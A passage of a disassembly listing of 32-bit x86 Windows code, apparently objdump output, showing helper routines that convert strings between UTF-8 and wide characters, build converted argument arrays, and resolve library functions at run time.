  404f1c:	89 74 24 08          	mov    %esi,0x8(%esp)
  404f20:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404f27:	00 
  404f28:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404f2f:	ff d7                	call   *%edi
  404f31:	83 ec 20             	sub    $0x20,%esp
  404f34:	85 c0                	test   %eax,%eax
  404f36:	74 2b                	je     0x404f63
  404f38:	83 c4 2c             	add    $0x2c,%esp
  404f3b:	89 d8                	mov    %ebx,%eax
  404f3d:	5b                   	pop    %ebx
  404f3e:	5e                   	pop    %esi
  404f3f:	5f                   	pop    %edi
  404f40:	5d                   	pop    %ebp
  404f41:	c3                   	ret
  404f42:	e8 e9 fe ff ff       	call   0x404e30
  404f47:	c7 04 24 90 d3 40 00 	movl   $0x40d390,(%esp)
  404f4e:	89 44 24 04          	mov    %eax,0x4(%esp)
  404f52:	31 db                	xor    %ebx,%ebx
  404f54:	e8 b7 ce ff ff       	call   0x401e10
  404f59:	83 c4 2c             	add    $0x2c,%esp
  404f5c:	89 d8                	mov    %ebx,%eax
  404f5e:	5b                   	pop    %ebx
  404f5f:	5e                   	pop    %esi
  404f60:	5f                   	pop    %edi
  404f61:	5d                   	pop    %ebp
  404f62:	c3                   	ret
  404f63:	e8 c8 fe ff ff       	call   0x404e30
  404f68:	c7 04 24 c8 d3 40 00 	movl   $0x40d3c8,(%esp)
  404f6f:	89 44 24 04          	mov    %eax,0x4(%esp)
  404f73:	31 db                	xor    %ebx,%ebx
  404f75:	e8 96 ce ff ff       	call   0x401e10
  404f7a:	eb bc                	jmp    0x404f38
  404f7c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404f80:	55                   	push   %ebp
  404f81:	57                   	push   %edi
  404f82:	56                   	push   %esi
  404f83:	53                   	push   %ebx
  404f84:	83 ec 2c             	sub    $0x2c,%esp
  404f87:	8b 3d 44 e2 41 00    	mov    0x41e244,%edi
  404f8d:	8b 74 24 40          	mov    0x40(%esp),%esi
  404f91:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404f98:	00 
  404f99:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404fa0:	00 
  404fa1:	89 34 24             	mov    %esi,(%esp)
  404fa4:	ff d7                	call   *%edi
  404fa6:	83 ec 0c             	sub    $0xc,%esp
  404fa9:	85 c0                	test   %eax,%eax
  404fab:	89 c3                	mov    %eax,%ebx
  404fad:	75 15                	jne    0x404fc4
  404faf:	e8 7c fe ff ff       	call   0x404e30
  404fb4:	89 74 24 40          	mov    %esi,0x40(%esp)
  404fb8:	83 c4 2c             	add    $0x2c,%esp
  404fbb:	5b                   	pop    %ebx
  404fbc:	5e                   	pop    %esi
  404fbd:	5f                   	pop    %edi
  404fbe:	5d                   	pop    %ebp
  404fbf:	e9 cc fe ff ff       	jmp    0x404e90
  404fc4:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
  404fc8:	89 04 24             	mov    %eax,(%esp)
  404fcb:	e8 f0 57 00 00       	call   0x40a7c0
  404fd0:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  404fd4:	89 c5                	mov    %eax,%ebp
  404fd6:	89 44 24 04          	mov    %eax,0x4(%esp)
  404fda:	89 34 24             	mov    %esi,(%esp)
  404fdd:	ff d7                	call   *%edi
  404fdf:	83 ec 0c             	sub    $0xc,%esp
  404fe2:	85 c0                	test   %eax,%eax
  404fe4:	89 2c 24             	mov    %ebp,(%esp)
  404fe7:	75 07                	jne    0x404ff0
  404fe9:	e8 1a 58 00 00       	call   0x40a808
  404fee:	eb bf                	jmp    0x404faf
  404ff0:	e8 9b fe ff ff       	call   0x404e90
  404ff5:	89 2c 24             	mov    %ebp,(%esp)
  404ff8:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404ffc:	e8 07 58 00 00       	call   0x40a808
  405001:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  405005:	85 c0                	test   %eax,%eax
  405007:	74 a6                	je     0x404faf
  405009:	83 c4 2c             	add    $0x2c,%esp
  40500c:	5b                   	pop    %ebx
  40500d:	5e                   	pop    %esi
  40500e:	5f                   	pop    %edi
  40500f:	5d                   	pop    %ebp
  405010:	c3                   	ret
  405011:	eb 0d                	jmp    0x405020
  405013:	90                   	nop
  405014:	90                   	nop
  405015:	90                   	nop
  405016:	90                   	nop
  405017:	90                   	nop
  405018:	90                   	nop
  405019:	90                   	nop
  40501a:	90                   	nop
  40501b:	90                   	nop
  40501c:	90                   	nop
  40501d:	90                   	nop
  40501e:	90                   	nop
  40501f:	90                   	nop
  405020:	57                   	push   %edi
  405021:	56                   	push   %esi
  405022:	53                   	push   %ebx
  405023:	83 ec 20             	sub    $0x20,%esp
  405026:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  40502a:	8b 7c 24 34          	mov    0x34(%esp),%edi
  40502e:	8b 74 24 38          	mov    0x38(%esp),%esi
  405032:	85 db                	test   %ebx,%ebx
  405034:	74 4a                	je     0x405080
  405036:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40503d:	00 
  40503e:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  405045:	00 
  405046:	89 74 24 14          	mov    %esi,0x14(%esp)
  40504a:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40504e:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  405055:	ff 
  405056:	89 7c 24 08          	mov    %edi,0x8(%esp)
  40505a:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405061:	00 
  405062:	c7 04 24 e9 fd 00 00 	movl   $0xfde9,(%esp)
  405069:	ff 15 98 e2 41 00    	call   *0x41e298
  40506f:	83 ec 20             	sub    $0x20,%esp
  405072:	85 c0                	test   %eax,%eax
  405074:	74 6a                	je     0x4050e0
  405076:	83 c4 20             	add    $0x20,%esp
  405079:	89 d8                	mov    %ebx,%eax
  40507b:	5b                   	pop    %ebx
  40507c:	5e                   	pop    %esi
  40507d:	5f                   	pop    %edi
  40507e:	c3                   	ret
  40507f:	90                   	nop
  405080:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  405087:	00 
  405088:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  40508f:	00 
  405090:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  405097:	00 
  405098:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40509f:	00 
  4050a0:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  4050a7:	ff 
  4050a8:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4050ac:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4050b3:	00 
  4050b4:	c7 04 24 e9 fd 00 00 	movl   $0xfde9,(%esp)
  4050bb:	ff 15 98 e2 41 00    	call   *0x41e298
  4050c1:	83 ec 20             	sub    $0x20,%esp
  4050c4:	85 c0                	test   %eax,%eax
  4050c6:	89 c6                	mov    %eax,%esi
  4050c8:	74 36                	je     0x405100
  4050ca:	8d 40 01             	lea    0x1(%eax),%eax
  4050cd:	89 04 24             	mov    %eax,(%esp)
  4050d0:	e8 eb 56 00 00       	call   0x40a7c0
  4050d5:	89 c3                	mov    %eax,%ebx
  4050d7:	e9 5a ff ff ff       	jmp    0x405036
  4050dc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4050e0:	e8 4b fd ff ff       	call   0x404e30
  4050e5:	c7 04 24 40 d4 40 00 	movl   $0x40d440,(%esp)
  4050ec:	89 44 24 04          	mov    %eax,0x4(%esp)
  4050f0:	31 db                	xor    %ebx,%ebx
  4050f2:	e8 19 cd ff ff       	call   0x401e10
  4050f7:	e9 7a ff ff ff       	jmp    0x405076
  4050fc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405100:	e8 2b fd ff ff       	call   0x404e30
  405105:	c7 04 24 04 d4 40 00 	movl   $0x40d404,(%esp)
  40510c:	89 44 24 04          	mov    %eax,0x4(%esp)
  405110:	e8 fb cc ff ff       	call   0x401e10
  405115:	e9 5c ff ff ff       	jmp    0x405076
  40511a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405120:	55                   	push   %ebp
  405121:	57                   	push   %edi
  405122:	31 ed                	xor    %ebp,%ebp
  405124:	56                   	push   %esi
  405125:	53                   	push   %ebx
  405126:	83 ec 2c             	sub    $0x2c,%esp
  405129:	8b 74 24 40          	mov    0x40(%esp),%esi
  40512d:	8b 7c 24 44          	mov    0x44(%esp),%edi
  405131:	8d 04 b5 04 00 00 00 	lea    0x4(,%esi,4),%eax
  405138:	89 04 24             	mov    %eax,(%esp)
  40513b:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40513f:	e8 7c 56 00 00       	call   0x40a7c0
  405144:	85 f6                	test   %esi,%esi
  405146:	89 c3                	mov    %eax,%ebx
  405148:	7f 0d                	jg     0x405157
  40514a:	eb 58                	jmp    0x4051a4
  40514c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405150:	83 c5 01             	add    $0x1,%ebp
  405153:	39 f5                	cmp    %esi,%ebp
  405155:	74 4d                	je     0x4051a4
  405157:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40515e:	00 
  40515f:	8b 04 af             	mov    (%edi,%ebp,4),%eax
  405162:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405169:	89 44 24 04          	mov    %eax,0x4(%esp)
  40516d:	e8 ae fe ff ff       	call   0x405020
  405172:	85 c0                	test   %eax,%eax
  405174:	89 04 ab             	mov    %eax,(%ebx,%ebp,4)
  405177:	75 d7                	jne    0x405150
  405179:	31 f6                	xor    %esi,%esi
  40517b:	85 ed                	test   %ebp,%ebp
  40517d:	78 13                	js     0x405192
  40517f:	90                   	nop
  405180:	8b 04 b3             	mov    (%ebx,%esi,4),%eax
  405183:	83 c6 01             	add    $0x1,%esi
  405186:	89 04 24             	mov    %eax,(%esp)
  405189:	e8 7a 56 00 00       	call   0x40a808
  40518e:	39 ee                	cmp    %ebp,%esi
  405190:	7e ee                	jle    0x405180
  405192:	89 1c 24             	mov    %ebx,(%esp)
  405195:	e8 6e 56 00 00       	call   0x40a808
  40519a:	83 c4 2c             	add    $0x2c,%esp
  40519d:	31 c0                	xor    %eax,%eax
  40519f:	5b                   	pop    %ebx
  4051a0:	5e                   	pop    %esi
  4051a1:	5f                   	pop    %edi
  4051a2:	5d                   	pop    %ebp
  4051a3:	c3                   	ret
  4051a4:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4051a8:	c7 44 03 fc 00 00 00 	movl   $0x0,-0x4(%ebx,%eax,1)
  4051af:	00 
  4051b0:	83 c4 2c             	add    $0x2c,%esp
  4051b3:	89 d8                	mov    %ebx,%eax
  4051b5:	5b                   	pop    %ebx
  4051b6:	5e                   	pop    %esi
  4051b7:	5f                   	pop    %edi
  4051b8:	5d                   	pop    %ebp
  4051b9:	c3                   	ret
  4051ba:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4051c0:	57                   	push   %edi
  4051c1:	56                   	push   %esi
  4051c2:	53                   	push   %ebx
  4051c3:	83 ec 20             	sub    $0x20,%esp
  4051c6:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  4051ca:	8b 7c 24 34          	mov    0x34(%esp),%edi
  4051ce:	8b 74 24 38          	mov    0x38(%esp),%esi
  4051d2:	85 db                	test   %ebx,%ebx
  4051d4:	74 3a                	je     0x405210
  4051d6:	89 74 24 14          	mov    %esi,0x14(%esp)
  4051da:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4051de:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  4051e5:	ff 
  4051e6:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4051ea:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4051f1:	00 
  4051f2:	c7 04 24 e9 fd 00 00 	movl   $0xfde9,(%esp)
  4051f9:	ff 15 68 e2 41 00    	call   *0x41e268
  4051ff:	83 ec 18             	sub    $0x18,%esp
  405202:	85 c0                	test   %eax,%eax
  405204:	74 5a                	je     0x405260
  405206:	83 c4 20             	add    $0x20,%esp
  405209:	89 d8                	mov    %ebx,%eax
  40520b:	5b                   	pop    %ebx
  40520c:	5e                   	pop    %esi
  40520d:	5f                   	pop    %edi
  40520e:	c3                   	ret
  40520f:	90                   	nop
  405210:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  405217:	00 
  405218:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40521f:	00 
  405220:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  405227:	ff 
  405228:	89 7c 24 08          	mov    %edi,0x8(%esp)
  40522c:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405233:	00 
  405234:	c7 04 24 e9 fd 00 00 	movl   $0xfde9,(%esp)
  40523b:	ff 15 68 e2 41 00    	call   *0x41e268
  405241:	83 ec 18             	sub    $0x18,%esp
  405244:	85 c0                	test   %eax,%eax
  405246:	89 c6                	mov    %eax,%esi
  405248:	74 36                	je     0x405280
  40524a:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
  40524e:	89 04 24             	mov    %eax,(%esp)
  405251:	e8 6a 55 00 00       	call   0x40a7c0
  405256:	89 c3                	mov    %eax,%ebx
  405258:	e9 79 ff ff ff       	jmp    0x4051d6
  40525d:	8d 76 00             	lea    0x0(%esi),%esi
  405260:	e8 cb fb ff ff       	call   0x404e30
  405265:	c7 04 24 40 d4 40 00 	movl   $0x40d440,(%esp)
  40526c:	89 44 24 04          	mov    %eax,0x4(%esp)
  405270:	31 db                	xor    %ebx,%ebx
  405272:	e8 99 cb ff ff       	call   0x401e10
  405277:	eb 8d                	jmp    0x405206
  405279:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405280:	e8 ab fb ff ff       	call   0x404e30
  405285:	c7 04 24 04 d4 40 00 	movl   $0x40d404,(%esp)
  40528c:	89 44 24 04          	mov    %eax,0x4(%esp)
  405290:	e8 7b cb ff ff       	call   0x401e10
  405295:	e9 6c ff ff ff       	jmp    0x405206
  40529a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4052a0:	55                   	push   %ebp
  4052a1:	57                   	push   %edi
  4052a2:	56                   	push   %esi
  4052a3:	53                   	push   %ebx
  4052a4:	83 ec 3c             	sub    $0x3c,%esp
  4052a7:	8b 44 24 50          	mov    0x50(%esp),%eax
  4052ab:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4052b2:	00 
  4052b3:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4052ba:	89 44 24 04          	mov    %eax,0x4(%esp)
  4052be:	e8 fd fe ff ff       	call   0x4051c0
  4052c3:	c7 04 24 7c d4 40 00 	movl   $0x40d47c,(%esp)
  4052ca:	89 c5                	mov    %eax,%ebp
  4052cc:	ff 15 60 e2 41 00    	call   *0x41e260
  4052d2:	83 ec 04             	sub    $0x4,%esp
  4052d5:	8b 1d 40 e2 41 00    	mov    0x41e240,%ebx
  4052db:	89 c6                	mov    %eax,%esi
  4052dd:	c7 44 24 04 85 d4 40 	movl   $0x40d485,0x4(%esp)
  4052e4:	00 
  4052e5:	89 04 24             	mov    %eax,(%esp)
  4052e8:	ff d3                	call   *%ebx
  4052ea:	83 ec 08             	sub    $0x8,%esp
  4052ed:	89 c7                	mov    %eax,%edi
  4052ef:	c7 44 24 04 93 d4 40 	movl   $0x40d493,0x4(%esp)
  4052f6:	00 
  4052f7:	89 34 24             	mov    %esi,(%esp)
  4052fa:	ff d3                	call   *%ebx
  4052fc:	89 c3                	mov    %eax,%ebx
  4052fe:	83 ec 08             	sub    $0x8,%esp
  405301:	31 c0                	xor    %eax,%eax
  405303:	85 db                	test   %ebx,%ebx
  405305:	74 6d                	je     0x405374
  405307:	85 ff                	test   %edi,%edi
  405309:	74 69                	je     0x405374
  40530b:	c7 44 04 10 00 00 00 	movl   $0x0,0x10(%esp,%eax,1)
  405312:	00 
  405313:	83 c0 04             	add    $0x4,%eax
  405316:	83 f8 20             	cmp    $0x20,%eax
  405319:	72 f0                	jb     0x40530b
  40531b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40531f:	c7 44 24 10 20 00 00 	movl   $0x20,0x10(%esp)
  405326:	00 
  405327:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  40532b:	c7 44 24 14 10 00 00 	movl   $0x10,0x14(%esp)
  405332:	00 
  405333:	89 04 24             	mov    %eax,(%esp)
  405336:	ff d7                	call   *%edi
  405338:	83 ec 04             	sub    $0x4,%esp
  40533b:	89 c6                	mov    %eax,%esi
  40533d:	a3 04 b0 40 00       	mov    %eax,0x40b004
  405342:	89 2c 24             	mov    %ebp,(%esp)
  405345:	e8 be 54 00 00       	call   0x40a808
  40534a:	83 fe ff             	cmp    $0xffffffff,%esi
  40534d:	74 14                	je     0x405363
  40534f:	c7 44 24 04 c0 d2 41 	movl   $0x41d2c0,0x4(%esp)
  405356:	00 
  405357:	89 34 24             	mov    %esi,(%esp)
  40535a:	ff d3                	call   *%ebx
  40535c:	83 ec 08             	sub    $0x8,%esp
  40535f:	85 c0                	test   %eax,%eax
  405361:	75 1d                	jne    0x405380
  405363:	c7 05 04 b0 40 00 ff 	movl   $0xffffffff,0x40b004
  40536a:	ff ff ff 
  40536d:	e8 be fa ff ff       	call   0x404e30
  405372:	31 c0                	xor    %eax,%eax
  405374:	83 c4 3c             	add    $0x3c,%esp
  405377:	5b                   	pop    %ebx
  405378:	5e                   	pop    %esi
  405379:	5f                   	pop    %edi
  40537a:	5d                   	pop    %ebp
  40537b:	c3                   	ret
  40537c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405380:	83 c4 3c             	add    $0x3c,%esp
  405383:	b8 01 00 00 00       	mov    $0x1,%eax
  405388:	5b                   	pop    %ebx
  405389:	5e                   	pop    %esi
  40538a:	5f                   	pop    %edi
  40538b:	5d                   	pop    %ebp
  40538c:	c3                   	ret
  40538d:	8d 76 00             	lea    0x0(%esi),%esi
  405390:	55                   	push   %ebp
  405391:	57                   	push   %edi
  405392:	31 ed                	xor    %ebp,%ebp
  405394:	56                   	push   %esi
  405395:	53                   	push   %ebx
  405396:	83 ec 2c             	sub    $0x2c,%esp
  405399:	8b 74 24 40          	mov    0x40(%esp),%esi
  40539d:	8b 7c 24 44          	mov    0x44(%esp),%edi
  4053a1:	8d 04 b5 04 00 00 00 	lea    0x4(,%esi,4),%eax
  4053a8:	89 04 24             	mov    %eax,(%esp)
  4053ab:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4053af:	e8 0c 54 00 00       	call   0x40a7c0
  4053b4:	85 f6                	test   %esi,%esi
  4053b6:	89 c3                	mov    %eax,%ebx
  4053b8:	7f 0d                	jg     0x4053c7
  4053ba:	eb 58                	jmp    0x405414
  4053bc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4053c0:	83 c5 01             	add    $0x1,%ebp
  4053c3:	39 f5                	cmp    %esi,%ebp
  4053c5:	74 4d                	je     0x405414
  4053c7:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4053ce:	00 
  4053cf:	8b 04 af             	mov    (%edi,%ebp,4),%eax
  4053d2:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4053d9:	89 44 24 04          	mov    %eax,0x4(%esp)
  4053dd:	e8 de fd ff ff       	call   0x4051c0
  4053e2:	85 c0                	test   %eax,%eax
  4053e4:	89 04 ab             	mov    %eax,(%ebx,%ebp,4)
  4053e7:	75 d7                	jne    0x4053c0
  4053e9:	31 f6                	xor    %esi,%esi
  4053eb:	85 ed                	test   %ebp,%ebp
  4053ed:	78 13                	js     0x405402
  4053ef:	90                   	nop
  4053f0:	8b 04 b3             	mov    (%ebx,%esi,4),%eax
  4053f3:	83 c6 01             	add    $0x1,%esi
  4053f6:	89 04 24             	mov    %eax,(%esp)
  4053f9:	e8 0a 54 00 00       	call   0x40a808
  4053fe:	39 ee                	cmp    %ebp,%esi
  405400:	7e ee                	jle    0x4053f0
  405402:	89 1c 24             	mov    %ebx,(%esp)
  405405:	e8 fe 53 00 00       	call   0x40a808
  40540a:	83 c4 2c             	add    $0x2c,%esp
  40540d:	31 c0                	xor    %eax,%eax
  40540f:	5b                   	pop    %ebx
  405410:	5e                   	pop    %esi
  405411:	5f                   	pop    %edi
  405412:	5d                   	pop    %ebp
  405413:	c3                   	ret
  405414:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  405418:	c7 44 03 fc 00 00 00 	movl   $0x0,-0x4(%ebx,%eax,1)
  40541f:	00 
  405420:	83 c4 2c             	add    $0x2c,%esp
  405423:	89 d8                	mov    %ebx,%eax
  405425:	5b                   	pop    %ebx
  405426:	5e                   	pop    %esi
  405427:	5f                   	pop    %edi
  405428:	5d                   	pop    %ebp
  405429:	c3                   	ret
  40542a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405430:	57                   	push   %edi
  405431:	56                   	push   %esi
  405432:	53                   	push   %ebx
  405433:	83 ec 10             	sub    $0x10,%esp
  405436:	8b 44 24 24          	mov    0x24(%esp),%eax
  40543a:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405441:	00 
  405442:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405449:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40544d:	89 44 24 04          	mov    %eax,0x4(%esp)
  405451:	e8 6a fd ff ff       	call   0x4051c0
  405456:	85 c0                	test   %eax,%eax
  405458:	89 c6                	mov    %eax,%esi
  40545a:	74 54                	je     0x4054b0
  40545c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405460:	89 34 24             	mov    %esi,(%esp)
  405463:	85 c0                	test   %eax,%eax
  405465:	75 3e                	jne    0x4054a5
  405467:	e8 24 fa ff ff       	call   0x404e90
  40546c:	89 c3                	mov    %eax,%ebx
  40546e:	89 34 24             	mov    %esi,(%esp)
  405471:	e8 92 53 00 00       	call   0x40a808
  405476:	85 db                	test   %ebx,%ebx
  405478:	74 36                	je     0x4054b0
  40547a:	85 ff                	test   %edi,%edi
  40547c:	74 1e                	je     0x40549c
  40547e:	8b 44 24 28          	mov    0x28(%esp),%eax
  405482:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  405486:	89 3c 24             	mov    %edi,(%esp)
  405489:	89 44 24 08          	mov    %eax,0x8(%esp)
  40548d:	e8 d6 53 00 00       	call   0x40a868
  405492:	89 1c 24             	mov    %ebx,(%esp)
  405495:	89 fb                	mov    %edi,%ebx
  405497:	e8 6c 53 00 00       	call   0x40a808
  40549c:	83 c4 10             	add    $0x10,%esp
  40549f:	89 d8                	mov    %ebx,%eax
  4054a1:	5b                   	pop    %ebx
  4054a2:	5e                   	pop    %esi
  4054a3:	5f                   	pop    %edi
  4054a4:	c3                   	ret
  4054a5:	e8 d6 fa ff ff       	call   0x404f80
  4054aa:	89 c3                	mov    %eax,%ebx
  4054ac:	eb c0                	jmp    0x40546e
  4054ae:	66 90                	xchg   %ax,%ax
  4054b0:	31 db                	xor    %ebx,%ebx
  4054b2:	eb e8                	jmp    0x40549c
  4054b4:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4054ba:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  4054c0:	55                   	push   %ebp
  4054c1:	57                   	push   %edi
  4054c2:	b8 1c 20 00 00       	mov    $0x201c,%eax
  4054c7:	56                   	push   %esi
  4054c8:	53                   	push   %ebx
  4054c9:	e8 82 50 00 00       	call   0x40a550
  4054ce:	29 c4                	sub    %eax,%esp
  4054d0:	8b b4 24 34 20 00 00 	mov    0x2034(%esp),%esi
  4054d7:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4054de:	00 
  4054df:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4054e6:	00 
  4054e7:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4054ee:	89 74 24 04          	mov    %esi,0x4(%esp)
  4054f2:	e8 39 ff ff ff       	call   0x405430
  4054f7:	85 c0                	test   %eax,%eax
  4054f9:	89 c3                	mov    %eax,%ebx
  4054fb:	74 77                	je     0x405574
  4054fd:	89 74 24 04          	mov    %esi,0x4(%esp)
  405501:	c7 44 24 0c 01 00 00 	movl   $0x1,0xc(%esp)
  405508:	00 
  405509:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405510:	00 
  405511:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405518:	e8 13 ff ff ff       	call   0x405430
  40551d:	85 c0                	test   %eax,%eax
  40551f:	89 c6                	mov    %eax,%esi
  405521:	74 5e                	je     0x405581
  405523:	8d 7c 24 10          	lea    0x10(%esp),%edi
  405527:	8d ac 24 10 10 00 00 	lea    0x1010(%esp),%ebp
  40552e:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  405532:	89 3c 24             	mov    %edi,(%esp)
  405535:	e8 06 d5 ff ff       	call   0x402a40
  40553a:	89 74 24 04          	mov    %esi,0x4(%esp)
  40553e:	89 2c 24             	mov    %ebp,(%esp)
  405541:	e8 8a d4 ff ff       	call   0x4029d0
  405546:	8b 84 24 30 20 00 00 	mov    0x2030(%esp),%eax
  40554d:	89 7c 24 08          	mov    %edi,0x8(%esp)
  405551:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  405555:	89 04 24             	mov    %eax,(%esp)
  405558:	e8 43 d5 ff ff       	call   0x402aa0
  40555d:	89 1c 24             	mov    %ebx,(%esp)
  405560:	e8 a3 52 00 00       	call   0x40a808
  405565:	89 34 24             	mov    %esi,(%esp)
  405568:	e8 9b 52 00 00       	call   0x40a808
  40556d:	8b 9c 24 30 20 00 00 	mov    0x2030(%esp),%ebx
  405574:	81 c4 1c 20 00 00    	add    $0x201c,%esp
  40557a:	89 d8                	mov    %ebx,%eax
  40557c:	5b                   	pop    %ebx
  40557d:	5e                   	pop    %esi
  40557e:	5f                   	pop    %edi
  40557f:	5d                   	pop    %ebp
  405580:	c3                   	ret
  405581:	89 1c 24             	mov    %ebx,(%esp)
  405584:	31 db                	xor    %ebx,%ebx
  405586:	e8 7d 52 00 00       	call   0x40a808
  40558b:	eb e7                	jmp    0x405574
  40558d:	8d 76 00             	lea    0x0(%esi),%esi
  405590:	83 ec 1c             	sub    $0x1c,%esp
  405593:	8b 44 24 28          	mov    0x28(%esp),%eax
  405597:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40559e:	00 
  40559f:	89 44 24 08          	mov    %eax,0x8(%esp)
  4055a3:	8b 44 24 24          	mov    0x24(%esp),%eax
  4055a7:	89 44 24 04          	mov    %eax,0x4(%esp)
  4055ab:	8b 44 24 20          	mov    0x20(%esp),%eax
  4055af:	89 04 24             	mov    %eax,(%esp)
  4055b2:	e8 79 fe ff ff       	call   0x405430
  4055b7:	83 c4 1c             	add    $0x1c,%esp
  4055ba:	c3                   	ret
  4055bb:	90                   	nop
  4055bc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4055c0:	83 ec 1c             	sub    $0x1c,%esp
  4055c3:	8b 44 24 28          	mov    0x28(%esp),%eax
  4055c7:	c7 44 24 0c 01 00 00 	movl   $0x1,0xc(%esp)
  4055ce:	00 
  4055cf:	89 44 24 08          	mov    %eax,0x8(%esp)
  4055d3:	8b 44 24 24          	mov    0x24(%esp),%eax
  4055d7:	89 44 24 04          	mov    %eax,0x4(%esp)
  4055db:	8b 44 24 20          	mov    0x20(%esp),%eax
  4055df:	89 04 24             	mov    %eax,(%esp)
  4055e2:	e8 49 fe ff ff       	call   0x405430
  4055e7:	83 c4 1c             	add    $0x1c,%esp
  4055ea:	c3                   	ret
  4055eb:	90                   	nop
  4055ec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4055f0:	55                   	push   %ebp
  4055f1:	57                   	push   %edi
  4055f2:	31 ff                	xor    %edi,%edi
  4055f4:	56                   	push   %esi
  4055f5:	53                   	push   %ebx
  4055f6:	83 ec 2c             	sub    $0x2c,%esp
  4055f9:	8b 44 24 40          	mov    0x40(%esp),%eax
  4055fd:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  405601:	8b 74 24 48          	mov    0x48(%esp),%esi
  405605:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  40560c:	89 04 24             	mov    %eax,(%esp)
  40560f:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  405613:	e8 a8 51 00 00       	call   0x40a7c0
  405618:	89 c3                	mov    %eax,%ebx
  40561a:	8b 44 24 40          	mov    0x40(%esp),%eax
  40561e:	85 c0                	test   %eax,%eax
  405620:	7f 0b                	jg     0x40562d
  405622:	eb 60                	jmp    0x405684
  405624:	83 c7 01             	add    $0x1,%edi
  405627:	3b 7c 24 40          	cmp    0x40(%esp),%edi
  40562b:	74 57                	je     0x405684
  40562d:	89 74 24 0c          	mov    %esi,0xc(%esp)
  405631:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405638:	00 
  405639:	8b 44 bd 00          	mov    0x0(%ebp,%edi,4),%eax
  40563d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405644:	89 44 24 04          	mov    %eax,0x4(%esp)
  405648:	e8 e3 fd ff ff       	call   0x405430
  40564d:	85 c0                	test   %eax,%eax
  40564f:	89 04 bb             	mov    %eax,(%ebx,%edi,4)
  405652:	75 d0                	jne    0x405624
  405654:	31 f6                	xor    %esi,%esi
  405656:	85 ff                	test   %edi,%edi
  405658:	78 18                	js     0x405672
